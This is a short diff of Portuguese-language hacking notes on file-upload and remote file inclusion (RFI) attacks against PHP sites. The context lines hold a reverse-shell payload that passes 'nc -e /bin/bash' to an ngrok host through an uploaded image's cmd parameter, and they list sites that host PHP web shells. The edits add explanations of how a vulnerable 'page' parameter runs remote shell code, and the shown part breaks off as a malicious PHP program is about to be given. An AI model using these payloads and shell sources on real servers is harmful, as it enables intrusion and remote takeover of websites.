@@ -23,7 +23,7 @@
     -clicar no diretorio da foto 
     -imagem.jpeg?cmd = nc -e /bin/bash ip ngrok port 
 
-- > RFI 
+- > RFI - > inclusão de código remoto  
 
  exemplo 1: 
   
@@ -33,7 +33,7 @@
  sites que possuem php shell:  
    - > https://r57.gen.tr/
    - > https://github.com/tennc/webshell 
-- Podemos pegar um site que possua uma shell interativa ( ou não ) e passar direto na url.
+- Podemos pegar um site que possua uma shell interativa ( ou não ) e passar direto na url já que o patametro "page" está lendo e executando arquivos.
 -----------------
  exemplo 2:
   podemos criar em php um programa malicioso:
